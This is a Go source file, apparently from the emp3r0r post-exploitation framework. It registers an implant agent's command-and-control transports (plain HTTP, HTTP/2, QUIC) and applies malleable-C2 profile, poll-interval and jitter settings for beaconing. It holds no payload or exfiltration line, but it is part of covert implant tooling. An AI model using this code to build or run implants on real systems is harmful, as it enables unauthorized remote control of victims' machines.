package c2transport

import (
	"context"
	"fmt"
	"io"
	"net/http"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/pkg/agenttransport"
)

// builtinDialer adapts the existing C2 channel wrappers to the generic
// agenttransport.Dialer contract. HTTP-specific configuration stays here;
// custom dialers never see an *http.Client.
type builtinDialer struct {
	mode string
}

func (d builtinDialer) Name() string { return d.mode }

func (d builtinDialer) Dial(ctx context.Context, target agenttransport.Target) (io.ReadWriteCloser, error) {
	wrapper, err := transport.GetC2ChannelWrapper(d.mode)
	if err != nil {
		return nil, err
	}
	if d.mode != def.C2ChannelModeQUIC && def.HTTPClient == nil {
		return nil, fmt.Errorf("c2 transport %q: HTTP client is not initialized", d.mode)
	}

	// HTTPChannelWrapper stores per-session settings on the wrapper. Copy it
	// before mutating so concurrent auxiliary streams cannot race on shared
	// fields.
	if httpWrapper, ok := wrapper.(*transport.HTTPChannelWrapper); ok {
		cfg := *httpWrapper
		cfg.Config = &common.RuntimeConfig.MalleableC2
		cfg.PollInterval = common.RuntimeConfig.PollInterval
		cfg.Jitter = common.RuntimeConfig.Jitter
		wrapper = &cfg
	}

	stream, resp, err := wrapper.Dial(ctx, def.HTTPClient, target.Address)
	if err != nil {
		return nil, fmt.Errorf("c2 transport %q: %w", d.mode, err)
	}
	if resp != nil && resp.StatusCode != http.StatusOK {
		if stream != nil {
			_ = stream.Close()
		}
		return nil, fmt.Errorf("c2 transport %q: bad status code: %d", d.mode, resp.StatusCode)
	}
	return stream, nil
}

func init() {
	for _, mode := range []string{
		def.C2ChannelModePlainHTTP,
		def.C2ChannelModeH2Conn,
		def.C2ChannelModeQUIC,
	} {
		agenttransport.Register(builtinDialer{mode: mode})
	}
}
